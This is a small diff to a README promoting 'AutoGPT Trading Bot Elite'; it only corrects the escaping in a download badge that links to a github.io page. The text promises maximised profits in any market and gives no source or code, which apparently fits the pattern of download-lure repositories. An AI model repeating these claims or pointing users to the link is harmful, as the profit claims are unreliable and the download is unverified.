@@ -2,7 +2,7 @@
 
 AutoGPT Trading Bot Elite is a next-generation AI-powered bot designed to revolutionize the way you trade. With deep learning and natural language processing, it automates complex trading strategies to help you make smarter, faster decisions. Whether you're a beginner or a pro, AutoGPT Trading Bot Elite simplifies trading and maximizes your profits in any market condition.
 
-[![Download AutoGPT Trading Bot Elite](https://img.shields.io/badge/Download-AutoGPT-Trading-Bot-Elite-blueviolet)](https://autogpt-trading-bot-elite.github.io/.github)
+[![Download AutoGPT Trading Bot Elite](https://img.shields.io/badge/Download-AutoGPT--Trading--Bot--Elite-blueviolet)](https://autogpt-trading-bot-elite.github.io/.github)
 
 ---
 
